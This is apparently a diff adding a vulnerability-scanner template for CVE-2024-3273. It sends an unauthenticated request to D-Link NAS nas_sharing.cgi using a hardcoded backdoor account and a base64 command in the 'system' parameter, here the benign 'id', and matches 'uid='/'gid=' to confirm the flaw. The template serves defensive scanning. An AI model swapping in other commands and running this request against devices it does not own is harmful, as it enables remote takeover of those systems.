@@ -1,0 +1,34 @@
+id: cve-2024-3273
+info:
+  name: D-Link nas_sharing.cgi Remote Code Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,cve-2024-3273
+  description: |
+    D-Link nas_sharing.cgi is vulnerable to remote code execution by exploiting the `system` parameter.
+
+variables:
+  payload: "{{base64('id')}}"
+
+http:
+  - raw:
+      - |
+        GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system={{payload}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "uid="
+          - "gid="
+          - "<config><nas_sharing>"
+      - type: word
+        part: header
+        words:
+          - "Content-Type"
+        negative: true
